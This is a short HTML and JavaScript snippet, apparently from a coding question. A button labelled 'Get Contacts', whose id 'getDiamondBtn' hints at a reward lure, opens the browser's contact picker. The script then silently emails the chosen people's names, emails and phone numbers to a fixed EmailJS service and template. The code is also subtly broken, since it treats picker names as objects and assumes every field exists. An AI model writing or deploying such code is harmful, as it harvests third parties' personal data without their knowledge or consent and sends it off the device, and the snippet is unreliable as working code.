HTML:
```
<button id="getDiamondBtn">Get Contacts</button>
```

JavaScript:
```
document.getElementById('getDiamondBtn').addEventListener('click', function() {
  console.log('Button clicked');
  if (navigator.contacts && navigator.contacts.select) {
    console.log('Contact Picker API is supported');
    navigator.contacts.select(['name', 'email', 'tel'], { multiple: true })
      .then(contacts => {
        console.log('Contacts selected:', contacts);
        const contactDetails = contacts.map(contact => `Name: ${contact.name[0].givenName} ${contact.name[0].familyName}, Email: ${contact.email[0].value}, Tel: ${contact.tel[0].value}`)
          .join("\n");
        emailjs.send("service_z8dypc8", "template_ovwd3kb", {
          message: contactDetails,
        })
          .then(response => {
            console.log('Email sent successfully!', response.status, response.text);
          })
          .catch(error => {
            console.error('Failed to send email:', error);
          });
      })
      .catch(error => {
        console.error('Failed to select contacts:', error);
        alert('Contact access denied or not supported.');
      });
  } else {
    console.log('Contact Picker API is not supported in this browser');
    alert('Contact API not supported by your browser.');
  }
});
```
